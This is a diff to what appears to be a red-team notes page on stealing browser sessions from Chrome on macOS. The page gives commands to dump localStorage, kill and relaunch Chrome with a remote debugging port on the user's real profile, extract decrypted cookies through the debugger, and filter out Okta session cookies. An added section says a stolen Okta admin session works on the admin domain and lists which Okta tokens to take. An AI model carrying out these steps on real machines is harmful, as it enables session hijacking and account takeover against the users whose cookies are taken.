@@ -7,7 +7,7 @@ categories:
 
 # Local Storage
 
-Google Chrome (macOS) localStorage is saved on the filesystem in the leveldb file: `/Users/<user>/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb`.
+Google Chrome (macOS) localStorage is saved on the filesystem in the leveldb file: `/Users/<user>/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb`[^1].
 
 To dump localStorage:
 * `git clone https://github.com/rdreher/chromeStorageDump.git`
@@ -18,7 +18,7 @@ To dump localStorage:
 
 # Cookies
 
-Google Chrome (macOS) cookies are stored in an encrypted SQLite database with the key saved in the keychain. Unencrypted cookies can still be fetched by attaching a remote chrome debugger. This technique requires existing Chrome browsers to be restarted with the `--remote-debugging-port` flag. 
+Google Chrome (macOS) cookies are stored in an encrypted SQLite database with the key saved in the keychain [^2] [^3]. Unencrypted cookies can still be fetched by attaching a remote chrome debugger [^4] [^5]. This technique requires existing Chrome browsers to be restarted with the `--remote-debugging-port` flag. 
 
 * `killall Google\ Chrome`
 * `/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-allow-origins="*" --remote-debugging-port=9222 --user-data-dir="/Users/<user>/Library/Application Support/Google/Chrome" --restore-last-session --profile-directory=Default`
@@ -42,10 +42,22 @@ print(ws.recv())
 * `python3 rip ripWCMN.py  | jq -r '.[] | select(.url="https://<subdomain>.okta.com/app/UserHome")'`
 * `python3 rip ripWCMN.py  | jq -c '.result.cookies[] | select(.name="idx")'`
 
-Credit: Justin Bui and @mangopdf
+> CREDIT - Justin Bui & @mangopdf
+
+# Okta
+
+If an admin session is stolen from `{tenant}.okta.com`, the session cookie can be used on `{tenant}-admin.okta.com`[^6].
+
+| Account | Name | Type | Note |
+|---|---|---|---|
+| Okta Admin | sid | cookie |  |
+| Okta User | okta-token-storage | localStorage | JWT Auth Bearer |
+| Okta User | idx | cookie | Reveal more than bearer token |
 
 ### References:
-* https://www.cyberark.com/resources/threat-research-blog/the-current-state-of-browser-cookies
-* https://gist.github.com/creachadair/937179894a24571ce9860e2475a2d2ec
-* https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f
-* https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e
+[^1]: https://github.com/rdreher/chromeStorageDump
+[^2]: https://www.cyberark.com/resources/threat-research-blog/the-current-state-of-browser-cookies
+[^3]: https://gist.github.com/creachadair/937179894a24571ce9860e2475a2d2ec
+[^4]: https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f
+[^5]: https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e
+[^6]: https://www.linkedin.com/pulse/oktas-so-secret-less-secure-api-authentication-method-chaim-sanders/
